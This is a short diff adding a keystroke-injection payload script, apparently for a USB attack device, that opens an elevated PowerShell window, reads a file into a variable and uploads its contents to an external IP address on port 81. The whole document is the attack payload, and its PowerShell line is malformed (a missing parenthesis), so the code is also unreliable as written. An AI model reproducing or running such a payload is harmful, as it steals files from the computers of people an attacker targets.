@@ -1,0 +1,14 @@
+CONTROL ESCAPE
+DELAY 1000
+STRING powershell
+DELAY 1000
+ADMIN
+DELAY 1000
+LEFTARROW
+ENTER
+DELAY 3000
+STRING $content = more $1$
+ENTER
+DELAY 1000
+STRING New-Object Net.WebClient).UploadString('http://104.248.157.103:81', $content); exit
+ENTER
